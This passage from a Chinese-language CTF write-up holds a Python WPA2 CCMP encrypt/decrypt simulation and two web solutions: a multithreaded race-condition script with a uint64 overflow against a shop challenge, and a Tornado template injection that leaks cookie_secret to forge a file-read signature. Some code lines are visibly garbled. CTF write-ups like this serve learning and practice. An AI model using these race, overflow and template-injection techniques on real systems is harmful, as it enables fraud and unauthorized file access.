            else:
                AAD += '\x00' * 2  # [24]..[25]
                tmp = list(B0)
                tmp[1] = '\x00'
                B0 = ''.join(tmp)
                tmp = list(AAD)
                tmp[1] = chr(22)
                AAD = ''.join(tmp)
        AAD += '\x00' * 6 
        cipher = AES.new(TK, AES.MODE_ECB)
        MIC = cipher.encrypt(B0)
        MIC = XOR(MIC, AAD, 16)
        MIC = cipher.encrypt(MIC)
        MIC = XOR(MIC, AAD[16:], 16)
        MIC = cipher.encrypt(MIC)
        tmp = list(B0)
        tmp[0] = chr(ord(tmp[0]) & 0x07)
        tmp[14] = '\x00'
        tmp[15] = '\x00'
        B0 = ''.join(tmp)
        B = cipher.encrypt(B0)
        initMIC = B
        offset =34
        blocks = 3
        last = 1
        print "TK"
        print repr(TK)
        print "B0"
        print repr(B0)
        decryptedPacket = indata.decode("hex")
        plain=""
        for i in range(1, blocks + 1):
            n = last if (last > 0 and i == blocks) else 16
            tmp = list(B0)
            tmp[14] = chr((i >> 8) & 0xFF)
            tmp[15] = chr(i & 0xFF)
            B0 = ''.join(tmp)
            B = cipher.encrypt(B0)
            print repr(B)
            out = XOR(decryptedPacket[offset:offset + n], B, n)
            plain += out
            offset += n
        return plain
    ssid="HuWang"
    psk="HSrObIZmBx6inYc2"
    aNonce="482d8d5f601ca1b671ab9cbdc30ad998b880168ccb3c26d6d7ed3cfc8149045a".decode("hex")
    sNonce="4fbbb10c26f7376867f29db85c189ae2c7b0e4023f5af3e9a73cae9c97b46cb1".decode("hex")
    apMac="47:C4:47:16:E8:7D"
    staMac="7F:57:0A:12:66:5B"
    apMac=apMac.replace(":","").lower().decode("hex")
    staMac=staMac.replace(":","").lower().decode("hex")
    A,B = MakeAB(aNonce,sNonce,apMac,staMac)
    ptk,pmk = MakeKeys(psk,ssid,A,B)
    key = ptk[-16:]
    cipher="88423a017f570a12665b47c44716e87d47c44716e87d609200005f85002096000000a6690951247f1faacc65af2069bf567a78c2aac8423d351a72510b001529121bf40be946e2ad07af00"
    print DecryptCCMP(cipher,key)
其中CMMP的相关代码：
    #!/usr/bin/env python
    import hmac
    from hashlib import pbkdf2_hmac,sha1,md5
    from Crypto.Cipher import AES
    import string
    import random
    import struct
    def PRF(key,A,B):
        nByte = 48
        i = 0
        R = ''
        while ( i l):
            res += b1[l:]
        return res
    def EncryptCCMP(indata,TK,PN):
        if len(TK) != 16 or len(PN) != 6:
            return None
        is_a4 = (ord(indata[1]) & 0x03) == 3
        is_qos = (ord(indata[0]) & 0x8c) == 0x88
        z = 24 + 6 * (1 if is_a4 else 0)
        z += 2 * (1 if is_qos else 0)
        h80211 = list(indata)
        h80211[z + 0] = PN[5]
        h80211[z + 1] = PN[4]
        h80211[z + 2] = '\x00'
        h80211[z + 3] = '\x20'
        h80211[z + 4] = PN[3]
        h80211[z + 5] = PN[2]
        h80211[z + 6] = PN[1]
        h80211[z + 7] = PN[0]
        inputpkt = ''.join(h80211)
        data_len=33
        B0 = ''
        B0 += '\x59'
        B0 += '\x00'
        B0 += inputpkt[10:16]
        B0 += PN
        B0 += chr((data_len >> 8) & 0xFF)
        B0 += chr(data_len & 0xFF)
        AAD = '\x00' * 2  # [0] [1]
        AAD += chr(ord(inputpkt[0]) & 0x8F)  # [2]
        AAD += chr(ord(inputpkt[1]) & 0xC7)  # [3]
        AAD += inputpkt[4:4 + 3 * 6]  # [4]..[21]
        AAD += chr(ord(inputpkt[22]) & 0x0F)  # [22]
        AAD += '\x00'  # [23]
        if (is_a4):
            AAD += inputpkt[24:24 + 6]  # [24]..[29]
            if (is_qos):
                AAD += chr(ord(inputpkt[z - 2]) & 0x0F)  # [30]
                AAD += '\x00'  # [31]
                tmp = list(B0)
                tmp[1] = AAD[30]
                B0 = ''.join(tmp)
                tmp = list(AAD)
                tmp[1] = chr(22 + 2 + 6)
                AAD = ''.join(tmp)
            else:
                AAD += '\x00' * 2  # [30]..[31]
                tmp = list(B0)
                tmp[1] = '\x00'
                B0 = ''.join(tmp)
                tmp = list(AAD)
                tmp[1] = chr(22 + 6)
                AAD = ''.join(tmp)
        else:
            if (is_qos):
                AAD += chr(ord(inputpkt[z - 2]) & 0x0F)  # [24]
                AAD += '\x00'  # [25]
                tmp = list(B0)
                tmp[1] = AAD[24]
                B0 = ''.join(tmp)
                tmp = list(AAD)
                tmp[1] = chr(22 + 2)
                AAD = ''.join(tmp)
            else:
                AAD += '\x00' * 2  # [24]..[25]
                tmp = list(B0)
                tmp[1] = '\x00'
                B0 = ''.join(tmp)
                tmp = list(AAD)
                tmp[1] = chr(22)
                AAD = ''.join(tmp)
            AAD += '\x00' * 6
        cipher = AES.new(TK, AES.MODE_ECB)
        MIC = cipher.encrypt(B0)
        MIC = XOR(MIC, AAD, 16)
        MIC = cipher.encrypt(MIC)
        MIC = XOR(MIC, AAD[16:], 16)
        MIC = cipher.encrypt(MIC)
        tmp = list(B0)
        tmp[0] = chr(ord(tmp[0]) & 0x07)
        tmp[14] = '\x00'
        tmp[15] = '\x00'
        B0 = ''.join(tmp)
        B = cipher.encrypt(B0)
        initMIC = B
        blocks = (data_len + 16 - 1) / 16
        last = data_len % 16
        offset = z + 8
        encryptedPacket = ''
        print offset
        print last
        print blocks
        for i in range(1, blocks + 1):
            n = last if (last > 0 and i == blocks) else 16
            MIC = XOR(MIC,inputpkt[offset:offset+n],n)
            MIC = cipher.encrypt(MIC)
            tmp = list(B0)
            tmp[14] = chr((i >> 8) & 0xFF)
            tmp[15] = chr(i & 0xFF)
            B0 = ''.join(tmp)
            B = cipher.encrypt(B0)
            out = XOR(inputpkt[offset:offset + n], B, n)
            encryptedPacket += out
            offset += n
        print len(encryptedPacket)
        encryptedPacket = inputpkt[:z+8] + encryptedPacket
        encryptedPacket += XOR(initMIC,MIC,8)[:8]
        return encryptedPacket
    if __name__=="__main__":
        print "Welcome to HuWang Bei WPA2 Simulation System.. Initilizing Parameters.."
        print ""
        ssid = "HuWang"
        psk = ''.join(random.choice(string.ascii_uppercase+ string.ascii_lowercase + string.digits) for _ in range(16))
        rnddev = open("/dev/urandom","rb")
        aNonce = rnddev.read(32)
        sNonce = rnddev.read(32)
        apMac = rnddev.read(6)
        staMac = rnddev.read(6)
        rnddev.close()
        print "SSID = "+ssid
        print ""
        print "PSK = "+psk
        print ""
        outmac=apMac.encode('hex').upper()
        macaddr = ''
        for i in range(len(outmac)):
            macaddr += outmac[i]
            if (i%2!=0 and iQ",random.randint(1,9999999))[2:]
        print repr(datapkt)
        print repr(key)
        print repr(packetNumber)
        outtoUser = EncryptCCMP(datapkt,key,packetNumber)
        print repr(outtoUser)   
        print "CCMP Encrypted Packet = "+outtoUser.encode("hex")
        print ""
        exit()  
        userinput = raw_input("Input decrypted challenge value in Packet:")
        print ""
        if (userinput == chlvalue):
            f = open("flag","r")
            content = f.read()
            f.close()
            print "Congratulations!Your flag is: "+content
        else:
            print "Wrong!"
## WEB
### LTSHOP
本题的考点在于条件竞争以及整数的溢出问题
通过多线程发包的方式使得购买到 5 个以上的大辣条
    import requests
    import threading
    url = "http://49.4.79.236:30189/"
    s = requests.Session()
    def post(querystring):
        headers = {
            'Cookie': "go_iris_cookie=93542bfe-f8e2-4e4e-ba4c-1b0c5c739342;",
            'Content-Type': "application/x-www-form-urlencoded"
        }
        response = s.post(url+querystring, headers=headers)
        print(response.text)
    def main():
        l = []
        for i in range(1000):
            l.append(threading.Thread(target=post, args=('buylt',)))
        for t in l:
            t.start()
        for t in l:
            t.join()
    if __name__ == '__main__':
        main()
此时我们可以得到超过 5 个以上的大辣条，但远远买不到足够的辣条之王
此时我们观察到我们可以控制批量购买的数量，不同数量的反馈是不同的，比如我购买 2 个，提醒的是大辣条数量不足，而购买 -1 个或者
99999999999999999999 则是数量非法，所以我们可以猜测题目使用 uint64 作为变量的类型。
可以推测题目的逻辑如下：
    var num uint
    if num * 5 <= 大辣条数目 {
        辣条之王 += num
    }
很明显存在着乘法上溢问题，如果我们构造 `num = 3689348814741910324`，经过测试可得 `num * 5 = 4`，`4 <= 5`
成立
    i = 2**64 // 5 + 1 # 3689348814741910324
    j = i * 5 % 2 ** 64 # 4
所以我们即可利用 4 个大辣条买到近乎无限的辣条之王（具体为 3689348814741910324 个），即可顺利购买 flag
### easy tornado
进入题目
    http://49.4.78.81:30980/
发现意思很明确，有签名，读文件  
发现
    http://49.4.78.81:30980/error?msg={{1^0}}
可模板注入，但过滤了非常多的符号，应该只能读个变量  
发现`handler.settings`存放了cookie_secret  
读取
    http://49.4.78.81:30980/error?msg={{handler.settings}}
随机构造签名读flag
    http://49.4.78.81:30980/file?filename=/fllllllllllag&signature=7bae09c2c6e2f6aa34df7dbee23db960
得到
    flag{67a3d3dec827645c1c92d1f2160c744f}